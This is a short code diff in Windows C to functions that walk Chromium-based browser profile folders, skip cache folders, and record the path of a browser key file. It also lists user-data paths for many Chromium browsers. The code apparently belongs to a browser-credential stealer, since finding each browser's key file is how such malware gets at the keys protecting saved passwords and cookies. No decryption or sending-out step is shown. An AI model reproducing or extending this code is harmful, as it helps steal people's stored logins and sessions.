@@ -90,9 +90,17 @@ BOOL ChromiumWalk
 	BOOL IsFound = FALSE;
 	LPWSTR lpChromiumKey = NULL;
 
+	if (StrStrW(lpPath, L"\\CacheStorage") || StrStrW(lpPath, L"\\Cache_Data")) {
+		return TRUE;
+	}
+
+	if (StrStrW(lpPath, L"\\Code Cache") || StrStrW(lpPath, L"\\WebStorage")) {
+		return FALSE;
+	}
+
 	pUserData = (PUSER_DATA)lpArgs;
 	lpFileName = PathFindFileNameW(lpPath);
-	lpChromiumKey = GetItemFileName(ChromiumKey);;
+	lpChromiumKey = GetItemFileName(ChromiumKey);
 	if (!StrCmpW(lpFileName, lpChromiumKey)) {
 		pUserData->lpKeyPath = DuplicateStrW(lpPath, 0);
 		goto CLEANUP;
@@ -241,6 +249,7 @@ PUSER_DATA* PickChromium
 		L"\\AppData\\Local\\DCBrowser\\User Data\\",
 		L"\\AppData\\Local\\SogouExplorer\\Webkit\\User Data\\",
 	};
+
 	LPWSTR BrowserNames[] = {
 		L"chrome",
 		L"chrome-beta",
